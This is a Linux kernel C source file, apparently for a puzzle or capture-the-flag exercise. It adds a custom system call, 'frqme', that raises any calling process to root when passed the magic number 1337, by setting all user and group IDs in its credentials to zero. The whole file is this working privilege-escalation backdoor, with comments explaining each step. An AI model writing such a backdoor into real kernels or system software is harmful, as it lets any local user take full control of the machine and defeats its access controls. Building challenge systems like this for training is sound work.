#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/uidgid.h>

SYSCALL_DEFINE1(frqme, int, magic_number)
{
    struct cred *new_creds;

    if (magic_number == 1337) {
        printk(KERN_INFO "FRQME: Clue accepted. Firing privilege override...\n");

        // 1. Prepare a clone of the CURRENT credentials
        new_creds = prepare_creds();
        if (!new_creds)
            return -ENOMEM;

        // 2. Manually set all IDs to 0 (The Root ID)
        // uid, gid, suid, sgid, euid, egid... all of them.
        new_creds->uid.val = new_creds->gid.val = 0;
        new_creds->euid.val = new_creds->egid.val = 0;
        new_creds->suid.val = new_creds->sgid.val = 0;
        new_creds->fsuid.val = new_creds->fsgid.val = 0;

        // 3. Apply the modified credentials to the process
        commit_creds(new_creds);
        
        return 0;
    }

    return -1;
}
